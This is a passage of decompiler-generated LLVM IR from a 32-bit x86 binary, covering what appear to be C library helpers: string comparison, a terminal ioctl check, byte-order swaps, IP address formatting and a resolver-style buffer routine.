  %v2_805169b = inttoptr i32 %v2_8051696 to i32*
  store i32 %v0_805169b, i32* %v2_805169b, align 4
  %v0_80516a0.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805169d

dec_label_pc_805169d:                             ; preds = %dec_label_pc_8051692, %dec_label_pc_8051696
  %v0_80516a0 = phi i32 [ 0, %dec_label_pc_8051692 ], [ %v0_80516a0.pre, %dec_label_pc_8051696 ]
  ret i32 %v0_80516a0

; uselistorder directives
  uselistorder i32 %v1_805166b, { 1, 2, 0 }
  uselistorder i32 %v1_8051668, { 1, 0, 2 }
  uselistorder i32 %v1_805163b, { 1, 0, 2 }
  uselistorder i32 %v1_8051613, { 0, 2, 1 }
  uselistorder i32 %v3_8051610, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805b6a0.320 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805169d, { 1, 0 }
  uselistorder label %dec_label_pc_8051692, { 1, 0 }
  uselistorder label %dec_label_pc_8051676, { 1, 0 }
  uselistorder label %dec_label_pc_805164e, { 1, 0 }
  uselistorder label %dec_label_pc_805160d, { 1, 0 }
}

define i32 @function_80516a8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80516a8:
  %v2_80516b8 = inttoptr i32 %arg2 to i8*
  %v3_80516b8 = call i32 @function_8054678(i8* %v2_80516b8, i32 %arg1)
  ret i32 %v3_80516b8
}

define i32 @function_80516c0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80516c0:
  %v4_80516c7 = ptrtoint i8* %arg1 to i32
  %v1_80516d318 = inttoptr i32 %arg2 to i8*
  %v2_80516d31931 = load i8, i8* %v1_80516d318, align 1
  %v4_80516d52335 = icmp eq i8 %v2_80516d31931, 0
  %v1_80516d72436 = icmp eq i1 %v4_80516d52335, false
  br i1 %v1_80516d72436, label %dec_label_pc_80516dd.lr.ph.lr.ph, label %dec_label_pc_805170d

dec_label_pc_80516dd.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80516c0
  %v3_80516d32032 = zext i8 %v2_80516d31931 to i32
  %v4_80516d3.pre.pre = load i32, i32* @eax, align 4
  %v5_80516d32133 = and i32 %v4_80516d3.pre.pre, -256
  %v6_80516d32234 = or i32 %v3_80516d32032, %v5_80516d32133
  %v4_80516dd.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80516dd.lr.ph

dec_label_pc_80516dd.lr.ph:                       ; preds = %dec_label_pc_80516dd.lr.ph.lr.ph, %dec_label_pc_8051708
  %v4_80516dd.pre = phi i32 [ %v4_80516dd.pre.pre, %dec_label_pc_80516dd.lr.ph.lr.ph ], [ %v0_80516ea, %dec_label_pc_8051708 ]
  %v6_80516d32239 = phi i32 [ %v6_80516d32234, %dec_label_pc_80516dd.lr.ph.lr.ph ], [ %v6_80516d322, %dec_label_pc_8051708 ]
  %v2_80516d31938 = phi i8 [ %v2_80516d31931, %dec_label_pc_80516dd.lr.ph.lr.ph ], [ %v2_80516d319, %dec_label_pc_8051708 ]
  %v0_805170837 = phi i32 [ %v4_80516c7, %dec_label_pc_80516dd.lr.ph.lr.ph ], [ %v1_8051708, %dec_label_pc_8051708 ]
  br label %dec_label_pc_80516dd

dec_label_pc_80516dd:                             ; preds = %dec_label_pc_80516dd.lr.ph, %dec_label_pc_80516fd
  %v4_80516dd = phi i32 [ %v4_80516dd.pre, %dec_label_pc_80516dd.lr.ph ], [ %v4_80516dd44, %dec_label_pc_80516fd ]
  %v6_80516d329 = phi i32 [ %v6_80516d32239, %dec_label_pc_80516dd.lr.ph ], [ %v6_80516d3, %dec_label_pc_80516fd ]
  %v2_80516d328 = phi i8 [ %v2_80516d31938, %dec_label_pc_80516dd.lr.ph ], [ %v2_80516d3, %dec_label_pc_80516fd ]
  %v1_80516d327 = phi i8* [ %v1_80516d318, %dec_label_pc_80516dd.lr.ph ], [ %v1_80516d3, %dec_label_pc_80516fd ]
  %v0_80516fd26 = phi i32 [ %arg2, %dec_label_pc_80516dd.lr.ph ], [ %v1_80516fd, %dec_label_pc_80516fd ]
  %v0_80516fe25 = phi i32 [ %v0_805170837, %dec_label_pc_80516dd.lr.ph ], [ %v1_80516fe, %dec_label_pc_80516fd ]
  %v1_80516dd = inttoptr i32 %v0_80516fe25 to i8*
  %v2_80516dd = load i8, i8* %v1_80516dd, align 1
  %v3_80516dd = zext i8 %v2_80516dd to i32
  %v5_80516dd = and i32 %v4_80516dd, -256
  %v6_80516dd = or i32 %v5_80516dd, %v3_80516dd
  %v15_80516e3 = icmp eq i8 %v2_80516d328, %v2_80516dd
  br i1 %v15_80516e3, label %dec_label_pc_80516fd, label %dec_label_pc_80516e7

dec_label_pc_80516e7:                             ; preds = %dec_label_pc_80516dd
  %v2_80516e7 = load i8, i8* %v1_80516dd, align 1
  %v3_80516e7 = zext i8 %v2_80516e7 to i32
  %v0_80516ea = load i32, i32* bitcast (i32** @global_var_805d880.323 to i32*), align 128
  %v2_80516f0 = load i8, i8* %v1_80516d327, align 1
  %v3_80516f0 = zext i8 %v2_80516f0 to i32
  %v2_80516f3 = mul nuw nsw i32 %v3_80516e7, 2
  %v3_80516f3 = add i32 %v2_80516f3, %v0_80516ea
  %v4_80516f3 = inttoptr i32 %v3_80516f3 to i16*
  %v5_80516f3 = load i16, i16* %v4_80516f3, align 2
  %v6_80516f3 = zext i16 %v5_80516f3 to i32
  %v4_80516f7 = mul nuw nsw i32 %v3_80516f0, 2
  %v5_80516f7 = add i32 %v4_80516f7, %v0_80516ea
  %v6_80516f7 = inttoptr i32 %v5_80516f7 to i16*
  %v7_80516f7 = load i16, i16* %v6_80516f7, align 2
  %v18_80516f7 = icmp eq i16 %v5_80516f3, %v7_80516f7
  %v1_80516fb = icmp eq i1 %v18_80516f7, false
  br i1 %v1_80516fb, label %dec_label_pc_8051701, label %dec_label_pc_80516fd

dec_label_pc_80516fd:                             ; preds = %dec_label_pc_80516e7, %dec_label_pc_80516dd
  %v4_80516dd44 = phi i32 [ %v0_80516ea, %dec_label_pc_80516e7 ], [ %v6_80516dd, %dec_label_pc_80516dd ]
  %v4_80516d36 = phi i32 [ %v6_80516f3, %dec_label_pc_80516e7 ], [ %v6_80516d329, %dec_label_pc_80516dd ]
  %v1_80516fd = add i32 %v0_80516fd26, 1
  %v1_80516fe = add i32 %v0_80516fe25, 1
  %v1_80516d3 = inttoptr i32 %v1_80516fd to i8*
  %v2_80516d3 = load i8, i8* %v1_80516d3, align 1
  %v3_80516d3 = zext i8 %v2_80516d3 to i32
  %v5_80516d3 = and i32 %v4_80516d36, -256
  %v6_80516d3 = or i32 %v3_80516d3, %v5_80516d3
  %v4_80516d5 = icmp eq i8 %v2_80516d3, 0
  %v1_80516d7 = icmp eq i1 %v4_80516d5, false
  br i1 %v1_80516d7, label %dec_label_pc_80516dd, label %dec_label_pc_805170d

dec_label_pc_8051701:                             ; preds = %dec_label_pc_80516e7
  %v4_8051701 = icmp eq i8 %v2_80516dd, 0
  br i1 %v4_8051701, label %dec_label_pc_805170b, label %dec_label_pc_8051708

dec_label_pc_8051708:                             ; preds = %dec_label_pc_8051701
  %v1_8051708 = add i32 %v0_805170837, 1
  %v2_80516d319 = load i8, i8* %v1_80516d318, align 1
  %v3_80516d320 = zext i8 %v2_80516d319 to i32
  %v5_80516d321 = and i32 %v6_80516f3, 65280
  %v6_80516d322 = or i32 %v3_80516d320, %v5_80516d321
  %v4_80516d523 = icmp eq i8 %v2_80516d319, 0
  %v1_80516d724 = icmp eq i1 %v4_80516d523, false
  br i1 %v1_80516d724, label %dec_label_pc_80516dd.lr.ph, label %dec_label_pc_805170d

dec_label_pc_805170b:                             ; preds = %dec_label_pc_8051701
  br label %dec_label_pc_805170d

dec_label_pc_805170d:                             ; preds = %dec_label_pc_8051708, %dec_label_pc_80516c0, %dec_label_pc_80516fd, %dec_label_pc_805170b
  %storemerge = phi i32 [ 0, %dec_label_pc_805170b ], [ %v4_80516c7, %dec_label_pc_80516c0 ], [ %v1_8051708, %dec_label_pc_8051708 ], [ %v0_805170837, %dec_label_pc_80516fd ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80516d319, { 1, 2, 0 }
  uselistorder i8 %v2_80516d3, { 1, 2, 0 }
  uselistorder i8* %v1_80516d3, { 1, 0 }
  uselistorder i32 %v0_80516ea, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80516fe25, { 1, 0 }
  uselistorder i8 %v2_80516d31931, { 0, 2, 1 }
  uselistorder i8* %v1_80516d318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805170d, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80516dd, { 1, 0 }
  uselistorder label %dec_label_pc_80516dd.lr.ph, { 1, 0 }
}

define i32 @function_8051730(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051730:
  %stack_var_-60 = alloca i32, align 4
  %v3_805173c = call i32 @function_8051750(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8051741 = icmp eq i32 %v3_805173c, 0
  %v1_8051743 = zext i1 %v1_8051741 to i32
  ret i32 %v1_8051743
}

define i32 @function_8051750(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8051750:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051750 = load i32, i32* @esi, align 4
  %v0_8051751 = load i32, i32* @ebx, align 4
  store i32 %v0_8051751, i32* %stack_var_-8, align 4
  %v2_8051755 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051755, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8051767 = call i32 @function_8050270(i32 %arg1, i32 21505, i32 %v2_8051755)
  store i32 %v3_8051767, i32* %eax.global-to-local, align 4
  store i32 %v3_8051767, i32* @esi, align 4
  %v1_8051771 = icmp eq i32 %v3_8051767, 0
  %v1_8051773 = icmp eq i1 %v1_8051771, false
  br i1 %v1_8051773, label %dec_label_pc_80517b8, label %dec_label_pc_8051775

dec_label_pc_8051775:                             ; preds = %dec_label_pc_8051750
  %v3_8051775 = load i32, i32* %stack_var_-44, align 4
  %v1_8051779 = load i32, i32* @ebx, align 4
  %v2_8051779 = inttoptr i32 %v1_8051779 to i32*
  store i32 %v3_8051775, i32* %v2_8051779, align 4
  %v1_805177f = load i32, i32* @ebx, align 4
  %v2_805177f = add i32 %v1_805177f, 4
  %v3_805177f = inttoptr i32 %v2_805177f to i32*
  %v1_8051786 = load i32, i32* @ebx, align 4
  %v2_8051786 = add i32 %v1_8051786, 8
  %v3_8051786 = inttoptr i32 %v2_8051786 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805178d = load i32, i32* @ebx, align 4
  %v2_805178d = add i32 %v1_805178d, 12
  %v3_805178d = inttoptr i32 %v2_805178d to i32*
  store i32 %tmp3, i32* %v3_805178d, align 4
  %v4_8051790 = zext i8 %tmp to i32
  %v5_8051790 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051790 = and i32 %v5_8051790, -256
  %v7_8051790 = or i32 %v6_8051790, %v4_8051790
  store i32 %v7_8051790, i32* %eax.global-to-local, align 4
  %v2_8051794 = load i32, i32* @ebx, align 4
  %v3_8051794 = add i32 %v2_8051794, 16
  %v4_8051794 = inttoptr i32 %v3_8051794 to i8*
  store i8 %tmp, i8* %v4_8051794, align 1
  %v0_8051797 = load i32, i32* %eax.global-to-local, align 4
  %v2_805179a = ptrtoint i32* %stack_var_-27 to i32
  %v0_805179f = load i32, i32* @ebx, align 4
  %v1_805179f = add i32 %v0_805179f, 17
  store i32 %v1_805179f, i32* %eax.global-to-local, align 4
  %v4_80517a3 = call i32 @function_80546a0(i32 %v1_805179f, i32 %v2_805179a, i32 19, i32 %v0_8051797)
  store i32 %v4_80517a3, i32* %eax.global-to-local, align 4
  %v3_80517b0 = inttoptr i32 %v4_80517a3 to i8*
  %v4_80517b0 = call i32 @function_805143c(i8* %v3_80517b0, i32 0, i32 13)
  store i32 %v4_80517b0, i32* %eax.global-to-local, align 4
  %v0_80517b8.pre = load i32, i32* @esi, align 4
  %v2_80517bd.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80517b8

dec_label_pc_80517b8:                             ; preds = %dec_label_pc_8051750, %dec_label_pc_8051775
  %v2_80517bd = phi i32 [ %v0_8051751, %dec_label_pc_8051750 ], [ %v2_80517bd.pre, %dec_label_pc_8051775 ]
  %v0_80517b8 = phi i32 [ %v3_8051767, %dec_label_pc_8051750 ], [ %v0_80517b8.pre, %dec_label_pc_8051775 ]
  store i32 %v0_80517b8, i32* %eax.global-to-local, align 4
  store i32 %v2_80517bd, i32* @ebx, align 4
  store i32 %v0_8051750, i32* @esi, align 4
  ret i32 %v0_80517b8

; uselistorder directives
  uselistorder i32 %v0_80517b8, { 1, 0 }
  uselistorder i32 %v3_8051767, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80517b8, { 1, 0 }
}

define i32 @function_80517c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80517c0:
  %v1_80517c4 = trunc i32 %arg1 to i16
  %v2_80517c4 = call i16 @llvm.bswap.i16(i16 %v1_80517c4)
  %v3_80517c4 = zext i16 %v2_80517c4 to i32
  ret i32 %v3_80517c4
}

define i32 @function_80517cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80517cc:
  %v1_80517d0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80517d0
}

define i32 @function_80517d3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80517d3:
  %v1_80517d7 = trunc i32 %arg1 to i16
  %v2_80517d7 = call i16 @llvm.bswap.i16(i16 %v1_80517d7)
  %v3_80517d7 = zext i16 %v2_80517d7 to i32
  ret i32 %v3_80517d7
}

define i32 @function_80517df(i32 %arg1) local_unnamed_addr {
dec_label_pc_80517df:
  %v1_80517e3 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80517e3
}

define i32 @function_80517fe(i8* %arg1) local_unnamed_addr {
dec_label_pc_80517fe:
  %v4_8051803 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051803, i32* @ebx, align 4
  %v2_8051807 = icmp eq i8* %arg1, null
  br i1 %v2_8051807, label %dec_label_pc_8051815, label %dec_label_pc_805180b

dec_label_pc_805180b:                             ; preds = %dec_label_pc_80517fe
  store i32 ptrtoint ([3 x i8]* @global_var_805c28b.324 to i32), i32* @esi, align 4
  %v3_8051810 = load i8, i8* %arg1, align 1
  %v4_8051810 = icmp eq i8 %v3_8051810, 0
  %v1_8051813 = icmp eq i1 %v4_8051810, false
  br i1 %v1_8051813, label %dec_label_pc_805181a, label %dec_label_pc_8051815

dec_label_pc_8051815:                             ; preds = %dec_label_pc_805180b, %dec_label_pc_80517fe
  store i32 ptrtoint (i32* @global_var_805c28d.325 to i32), i32* @esi, align 4
  br label %dec_label_pc_805181a

dec_label_pc_805181a:                             ; preds = %dec_label_pc_805180b, %dec_label_pc_8051815
  %v0_805181a = call i32 @function_8053b78()
  store i32 ptrtoint ([15 x i8]* @global_var_805c27c.326 to i32), i32* @edx, align 4
  %v1_8051824 = inttoptr i32 %v0_805181a to i32*
  %v2_8051824 = load i32, i32* %v1_8051824, align 4
  %v6_8051829 = icmp ugt i32 %v2_8051824, 4
  br i1 %v6_8051829, label %dec_label_pc_8051832, label %dec_label_pc_805182b

dec_label_pc_805182b:                             ; preds = %dec_label_pc_805181a
  %v1_805182b = mul i32 %v2_8051824, 4
  %v2_805182b = add i32 %v1_805182b, ptrtoint ([5 x i8*]* @global_var_805c268.332 to i32)
  %v3_805182b = inttoptr i32 %v2_805182b to i32*
  %v4_805182b = load i32, i32* %v3_805182b, align 4
  store i32 %v4_805182b, i32* @edx, align 4
  br label %dec_label_pc_8051832

dec_label_pc_8051832:                             ; preds = %dec_label_pc_805181a, %dec_label_pc_805182b
  %v0_8051835 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805c27c.326 to i32), %dec_label_pc_805181a ], [ %v4_805182b, %dec_label_pc_805182b ]
  %v0_8051836 = load i32, i32* @esi, align 4
  %v0_805183d = load i32, i32* inttoptr (i32 134600240 to i32*), align 16
  %v9_8051843 = call i32 @function_8053c6c(i32 %v0_805183d, i32 ptrtoint ([8 x i8]* @global_var_805c1fa.333 to i32), i32 %v4_8051803, i32 %v0_8051836, i32 %v0_8051835)
  ret i32 %v9_8051843

; uselistorder directives
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051832, { 1, 0 }
  uselistorder label %dec_label_pc_805181a, { 1, 0 }
}

define i32 @function_8051850(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051850:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051850 = load i32, i32* @edi, align 4
  %v0_8051851 = load i32, i32* @esi, align 4
  %v0_8051852 = load i32, i32* @ebx, align 4
  store i32 %v0_8051852, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_805185d = add i32 %arg2, 15
  store i32 %v1_805185d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8051862 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8051862, 16777216
  %v1_8051864 = sdiv i32 %sext, 16777216
  store i32 %v1_8051864, i32* @ebx, align 4
  br label %dec_label_pc_8051868

dec_label_pc_8051868:                             ; preds = %dec_label_pc_8051850, %dec_label_pc_805188d
  %v0_805186b17 = phi i32 [ %v1_8051864, %dec_label_pc_8051850 ], [ %v2_805188d, %dec_label_pc_805188d ]
  %v0_805189816 = phi i32 [ %v1_805185d, %dec_label_pc_8051850 ], [ %v0_8051891, %dec_label_pc_805188d ]
  %v1_805186d = urem i32 %v0_805186b17, 256
  %v5_805187b = inttoptr i32 %v0_805189816 to i8*
  %v6_805187b = call i32 @function_8053f34(i8* %v5_805187b, i32 %v1_805186d, i32 0, i32 -10, i32 0)
  %v0_8051883 = load i32, i32* @esi, align 4
  %v1_8051883 = icmp eq i32 %v0_8051883, 0
  %v1_8051885 = add i32 %v6_805187b, -1
  store i32 %v1_8051885, i32* %ecx.global-to-local, align 4
  br i1 %v1_8051883, label %dec_label_pc_805188d, label %dec_label_pc_805188a

dec_label_pc_805188a:                             ; preds = %dec_label_pc_8051868
  %v1_805188a = inttoptr i32 %v0_8051883 to i8*
  store i8 46, i8* %v1_805188a, align 1
  %v0_8051891.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805188d

dec_label_pc_805188d:                             ; preds = %dec_label_pc_8051868, %dec_label_pc_805188a
  %v0_8051891 = phi i32 [ %v1_8051885, %dec_label_pc_8051868 ], [ %v0_8051891.pre, %dec_label_pc_805188a ]
  %v0_805188d = load i32, i32* @ebx, align 4
  %v2_805188d = udiv i32 %v0_805188d, 256
  store i32 %v2_805188d, i32* @ebx, align 4
  %v0_8051890 = load i32, i32* @edi, align 4
  %v1_8051890 = add i32 %v0_8051890, 1
  store i32 %v1_8051890, i32* @edi, align 4
  store i32 %v0_8051891, i32* @esi, align 4
  %v7_8051896 = icmp sgt i32 %v1_8051890, 3
  br i1 %v7_8051896, label %dec_label_pc_8051898, label %dec_label_pc_8051868

dec_label_pc_8051898:                             ; preds = %dec_label_pc_805188d
  %v1_8051898 = add i32 %v0_8051891, 1
  %v2_805189b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805189b, i32* @ebx, align 4
  store i32 %v0_8051851, i32* @esi, align 4
  store i32 %v0_8051850, i32* @edi, align 4
  ret i32 %v1_8051898

; uselistorder directives
  uselistorder i32 %v0_8051891, { 0, 2, 1 }
  uselistorder i32 %v1_8051864, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @function_8053f34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805188d, { 1, 0 }
  uselistorder label %dec_label_pc_8051868, { 1, 0 }
}

define i32 @function_805189f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805189f:
  %v2_80518ab = call i32 @function_8051850(i32 %arg1, i32 ptrtoint (i32* @global_var_8063904.334 to i32))
  ret i32 %v2_80518ab
}

define i32 @function_80518b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80518b4:
  %stack_var_-4 = alloca i32, align 4
  %v2_80518b7 = ptrtoint i32* %stack_var_-4 to i32
  %v2_80518c0 = inttoptr i32 %arg1 to i8*
  %v3_80518c0 = call i32 @function_80547f8(i8* %v2_80518c0, i32 %v2_80518b7)
  %v1_80518cb = icmp eq i32 %v3_80518c0, 0
  br i1 %v1_80518cb, label %dec_label_pc_80518d3, label %dec_label_pc_80518cf

dec_label_pc_80518cf:                             ; preds = %dec_label_pc_80518b4
  %v3_80518cf = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80518d3

dec_label_pc_80518d3:                             ; preds = %dec_label_pc_80518b4, %dec_label_pc_80518cf
  %v0_80518d3 = phi i32 [ -1, %dec_label_pc_80518b4 ], [ %v3_80518cf, %dec_label_pc_80518cf ]
  ret i32 %v0_80518d3

; uselistorder directives
  uselistorder label %dec_label_pc_80518d3, { 1, 0 }
}

define i32 @function_80518dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80518dc:
  %stack_var_-4 = alloca i32, align 4
  %v0_80518df = call i32 @function_8053b78()
  %v0_80518e4 = load i32, i32* @edx, align 4
  %v2_80518e7 = ptrtoint i32* %stack_var_-4 to i32
  %v9_80518ff = call i32 @function_805190c(i32 %arg1, i32* nonnull @global_var_8063aec.336, i32 ptrtoint (i32* @global_var_8063920.335 to i32), i32 460, i32 %v2_80518e7, i32 %v0_80518df, i32 %v0_80518e4, i32 %v0_80518e4)
  %v3_8051904 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8051904
}

define i32 @function_805190c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_805190c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_2()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805190c = load i32, i32* @ebp, align 4
  %v0_805190d = load i32, i32* @edi, align 4
  %v0_805190e = load i32, i32* @esi, align 4
  %v0_805190f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805191f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805191f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805192a = icmp eq i32 %arg1, 0
  br i1 %v4_805192a, label %dec_label_pc_8051c36, label %dec_label_pc_8051935

dec_label_pc_8051935:                             ; preds = %dec_label_pc_805190c
  %v1_8051935 = call i32 @function_8050568(i32 %v0_805190f)
  store i32 %v1_8051935, i32* %eax.global-to-local, align 4
  store i32 %v1_8051935, i32* @esi, align 4
  %v1_805193c = inttoptr i32 %v1_8051935 to i32*
  %v2_805193c = load i32, i32* %v1_805193c, align 4
  store i32 %v2_805193c, i32* @edi, align 4
  store i32 0, i32* %v1_805193c, align 4
  %v0_805194d = load i32, i32* @ebx, align 4
  store i32 %v0_805194d, i32* %stack_var_-108, align 4
  %v7_8051959 = call i32 @function_8055224(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805194d, i32 %arg5, i32 %arg6, i32 %v1_8051935)
  store i32 %v7_8051959, i32* %eax.global-to-local, align 4
  %v1_8051961 = icmp eq i32 %v7_8051959, 0
  br i1 %v1_8051961, label %dec_label_pc_8051c36, label %dec_label_pc_8051969

dec_label_pc_8051969:                             ; preds = %dec_label_pc_8051935
  store i32 %arg6, i32* @ecx, align 4
  %v1_805196d = inttoptr i32 %arg6 to i32*
  %v2_805196d = load i32, i32* %v1_805196d, align 4
  store i32 %v2_805196d, i32* %edx.global-to-local, align 4
  %v9_805196f = icmp eq i32 %v2_805196d, 1
  br i1 %v9_805196f, label %dec_label_pc_8051989, label %dec_label_pc_8051974

dec_label_pc_8051974:                             ; preds = %dec_label_pc_8051969
  %v9_8051974 = icmp eq i32 %v2_805196d, 4
  br i1 %v9_8051974, label %dec_label_pc_8051989, label %dec_label_pc_8051979

dec_label_pc_8051979:                             ; preds = %dec_label_pc_8051974
  %v1_8051979 = add i32 %v2_805196d, 1
  %v8_8051979 = icmp eq i32 %v1_8051979, 0
  store i32 %v1_8051979, i32* %edx.global-to-local, align 4
  %v1_805197a = icmp eq i1 %v8_8051979, false
  br i1 %v1_805197a, label %dec_label_pc_8051c36, label %dec_label_pc_8051980

dec_label_pc_8051980:                             ; preds = %dec_label_pc_8051979
  %v0_8051980 = load i32, i32* @esi, align 4
  %v1_8051980 = inttoptr i32 %v0_8051980 to i32*
  %v2_8051980 = load i32, i32* %v1_8051980, align 4
  %v11_8051980 = icmp eq i32 %v2_8051980, 2
  %v1_8051983 = icmp eq i1 %v11_8051980, false
  br i1 %v1_8051983, label %dec_label_pc_8051c36, label %dec_label_pc_8051989

dec_label_pc_8051989:                             ; preds = %dec_label_pc_8051980, %dec_label_pc_8051974, %dec_label_pc_8051969
  %v0_8051989 = load i32, i32* @ebp, align 4
  store i32 %v0_8051989, i32* %eax.global-to-local, align 4
  %v0_805198b = load i32, i32* @edi, align 4
  %v1_805198b = load i32, i32* @esi, align 4
  %v2_805198b = inttoptr i32 %v1_805198b to i32*
  store i32 %v0_805198b, i32* %v2_805198b, align 4
  %v0_805198d = load i32, i32* %eax.global-to-local, align 4
  %v1_805198d = sub i32 0, %v0_805198d
  %v1_805198f = urem i32 %v1_805198d, 4
  %v2_805198f = icmp eq i32 %v1_805198f, 0
  store i32 %v1_805198f, i32* %eax.global-to-local, align 4
  %v0_80519a4.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805198f, label %dec_label_pc_80519a0, label %dec_label_pc_8051994

dec_label_pc_8051994:                             ; preds = %dec_label_pc_8051989
  %v2_8051994 = sub i32 %v0_80519a4.pre, %v1_805198f
  %v7_8051994 = icmp ult i32 %v0_80519a4.pre, %v1_805198f
  br i1 %v7_8051994, label %dec_label_pc_8051c31, label %dec_label_pc_805199c

dec_label_pc_805199c:                             ; preds = %dec_label_pc_8051994
  %v0_805199c = load i32, i32* @ebp, align 4
  %v2_805199c = add i32 %v0_805199c, %v1_805198f
  store i32 %v2_805199c, i32* @ebp, align 4
  store i32 %v2_8051994, i32* @ebx, align 4
  br label %dec_label_pc_80519a0

dec_label_pc_80519a0:                             ; preds = %dec_label_pc_8051989, %dec_label_pc_805199c
  %v0_80519a4 = phi i32 [ %v2_8051994, %dec_label_pc_805199c ], [ %v0_80519a4.pre, %dec_label_pc_8051989 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805196d, align 4
  %tmp43 = icmp ult i32 %v0_80519a4, 4
  br i1 %tmp43, label %dec_label_pc_8051c31, label %dec_label_pc_80519b3

dec_label_pc_80519b3:                             ; preds = %dec_label_pc_80519a0
  %v0_80519b3 = load i32, i32* @ebx, align 4
  %v1_80519b3 = add i32 %v0_80519b3, -4
  store i32 %v1_80519b3, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_80519b3, 8
  br i1 %tmp44, label %dec_label_pc_8051c31, label %dec_label_pc_80519bf

dec_label_pc_80519bf:                             ; preds = %dec_label_pc_80519b3
  %v0_80519bf = load i32, i32* @ebp, align 4
  %v1_80519bf = add i32 %v0_80519bf, 4
  store i32 %v1_80519bf, i32* %edx.global-to-local, align 4
  %v1_80519c2 = add i32 %v0_80519b3, -12
  store i32 %v1_80519c2, i32* %eax.global-to-local, align 4
  store i32 %v1_80519bf, i32* %stack_var_-92, align 4
  %v3_80519cb = inttoptr i32 %v1_80519bf to i32*
  store i32 %v0_80519bf, i32* %v3_80519cb, align 4
  %v0_80519ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80519ce = add i32 %v0_80519ce, 4
  %v2_80519ce = inttoptr i32 %v1_80519ce to i32*
  store i32 0, i32* %v2_80519ce, align 4
  %tmp45 = icmp ult i32 %v1_80519c2, 32
  br i1 %tmp45, label %dec_label_pc_8051c31, label %dec_label_pc_80519db

dec_label_pc_80519db:                             ; preds = %dec_label_pc_80519bf
  %v0_80519db = load i32, i32* @ebx, align 4
  %v1_80519db = add i32 %v0_80519db, -44
  store i32 %v1_80519db, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_80519db, 256
  br i1 %tmp46, label %dec_label_pc_8051c31, label %dec_label_pc_80519ee

dec_label_pc_80519ee:                             ; preds = %dec_label_pc_80519db
  %v0_80519ee = load i32, i32* @ebp, align 4
  %v1_80519ee = add i32 %v0_80519ee, 12
